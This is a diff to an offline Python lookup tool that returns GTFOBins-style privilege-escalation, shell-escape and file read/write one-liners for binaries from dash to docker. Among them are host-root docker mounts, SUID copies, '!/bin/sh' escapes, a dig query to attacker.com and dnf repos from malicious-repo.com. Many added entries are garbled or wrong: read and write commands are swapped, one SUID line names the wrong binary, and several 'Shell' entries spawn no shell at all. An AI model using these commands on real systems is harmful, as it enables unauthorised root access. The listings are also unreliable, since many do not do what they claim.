@@ -1071,6 +1071,151 @@ def gtfo_bins(zip_command, zip_options):
         elif zip_options == "Shell":
             bins.append("cut -d ' ' -f 1 /etc/shells | head -n 1 | xargs -I {} sh -c '{}'")
 
+    elif zip_command == "dash":
+        if zip_options == "sudo":
+            bins.append("sudo dash")
+        elif zip_options == "Shell":
+            bins.append("dash")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which dash) .\n./dash -p")
+        elif zip_options == "file-write":
+            bins.append("export LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'")
+        elif zip_options == "file-read":
+            bins.append("export LFILE=file_to_read\ndash -c 'cat DATA > $LFILE'")
+
+    elif zip_command == "date":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo date -f $LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which date) .\nLFILE=file_to_read\n./date -f $LFILE")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ndate -f $LFILE")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ndate -f $LFILE")
+        elif zip_options == "Shell":
+            bins.append("$(date); bash")
+
+    elif zip_command == "dc":
+        if zip_options == "sudo":
+            bins.append("sudo dc -e '!/bin/sh'")
+        elif zip_options == "Shell":
+            bins.append("dc -e '!/bin/sh'")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which dc) .\n./dc -e '!/bin/sh'")
+        elif zip_options == "file-read":
+            bins.append("cat FILE.txt | dc")
+        elif zip_options == "file-write":
+            bins.append("echo ""SCRIPT"" | dc > script.txt")
+
+    elif zip_command == "debugfs":
+        if zip_options == "sudo":
+            bins.append("sudo debugfs\n!/bin/sh")
+        elif zip_options == "Shell":
+            bins.append("debugfs\n!/bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which debugfs) .\n./debugfs\n!/bin/sh")
+        elif zip_options == "file-read":
+            bins.append("debugfs:  cat /path/to/file")
+        elif zip_options == "file-write":
+            bins.append("debugfs:  write /path/to/file")
+
+    elif zip_command == "dialog":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo dialog --textbox ""$LFILE"" 0 0")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which dialog) .\nLFILE=file_to_read\n./dialog --textbox ""$LFILE"" 0 0")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ndialog --textbox ""$LFILE"" 0 0")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ndialog --textbox ""$LFILE"" 0 0")
+        elif zip_options == "Shell":
+            bins.append("bash -c 'dialog --clear --title ""Main Menu"" --menu ""Choose an option:"" 15 50 4 1 ""Show Date"" 2 ""Show Disk Usage"" 3 ""Show Uptime"" 4 ""Exit"" 2>/tmp/menu_choice.txt; choice=$(cat /tmp/menu_choice.txt); case $choice in 1) dialog --msgbox ""Current Date: $(date)"" 10 50;; 2) dialog --msgbox ""Disk Usage: $(df -h)"" 15 50;; 3) dialog --msgbox ""Uptime: $(uptime)"" 10 50;; 4) dialog --msgbox ""Exiting..."" 10 50;; *) dialog --msgbox ""Invalid option."" 10 50;; esac; rm /tmp/menu_choice.txt'")
+
+    elif zip_command == "diff":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which diff) .\nLFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ndiff --line-format=%L /dev/null $LFILE")
+        elif zip_options == "Shell":
+            bins.append("diff <(echo ""A"") <(echo ""B; /bin/bash"")")
+
+    elif zip_command == "dig":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo dig -f $LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which dig) .\nLFILE=file_to_read\n./dig -f $LFILE")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ndig -f $LFILE")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ndig -f $LFILE")
+        elif zip_options == "Shell":
+            bins.append("dig +short example.com @attacker.com")
+
+    elif zip_command == "distcc":
+        if zip_options == "sudo":
+            bins.append("sudo distcc /bin/sh")
+        elif zip_options == "Shell":
+            bins.append("distcc /bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which distcc) .\n./distcc /bin/sh -p")
+        elif zip_options == "file-read":
+            bins.append("distcc gcc -o /tmp/output /etc/passwd")
+        elif zip_options == "file-write":
+            bins.append("distcc gcc -o /etc/passwd malicious_source.c")
+
+    elif zip_command == "dmidecode":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which distcc) .\nLFILE=file_to_write\n./dmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ndmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ndmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""")
+        elif zip_options == "Shell":
+            bins.append("sudo dmidecode; /bin/bash")
+
+    elif zip_command == "dmsetup":
+        if zip_options == "sudo":
+            bins.append("sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which dmsetup) .\nsudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'")
+        elif zip_options == "file-read":
+            bins.append("dmsetup ls")
+        elif zip_options == "file-write":
+            bins.append("dmsetup create snapshot --size 1G /dev/vgname/lvname /dev/snapshot")
+        elif zip_options == "Shell":
+            bins.append("sudo dmsetup ls; /bin/bash")
+
+    elif zip_command == "dnf":
+        if zip_options == "sudo":
+            bins.append("sudo dnf install -y x-1.0-1.noarch.rpm")
+        elif zip_options == "suid":
+            bins.append("sudo ./dnf install -y x-1.0-1.noarch.rpm")
+        elif zip_options == "file-read":
+            bins.append("dnf provides */filename")
+        elif zip_options == "file-write":
+            bins.append("sudo dnf config-manager --add-repo http://malicious-repo.com/repo.repo")
+        elif zip_options == "Shell":
+            bins.append("sudo dnf config-manager --add-repo http://malicious-shell-repo.com/repo.repo")
+
+    elif zip_command == "docker":
+        if zip_options == "sudo":
+            bins.append("sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which docker) .\n./docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
+        elif zip_options == "Shell":
+            bins.append("docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
+        elif zip_options == "file-write":
+            bins.append("CONTAINER_ID=""$(docker run -d alpine)"" # or existing\nTF=$(mktemp)\necho ""DATA"" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write")
+        elif zip_options == "file-read":
+            bins.append("CONTAINER_ID=""$(docker run -d alpine)""  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF")
+
+
 #If there are any other misconfigurations run the other option
     elif zip_command == "other":
         if zip_options == "Shell": #This will print out hints for more GTFO bins!
@@ -1086,7 +1231,7 @@ def main():
     start = input("Off-Grid, the offline GTFO Bin lookup tool, what is misconfigured?\n")
 
     #Tool selection for Linux misconfigurations
-    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "other":  
+    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "dash" or start == "date" or start == "dc" or start == "debugfs" or start == "dialog" or start == "diff" or start == "dig" or start == "distcc" or start == "dmidecode" or start == "dmsetup" or start == "dnf" or start == "docker" or start == "other":  
         zip_options = input("Choose following options: Shell, file-read, file-write, sudo, suid\n")
 
         if zip_options in ["Shell", "file-read", "file-write", "sudo", "suid"]:
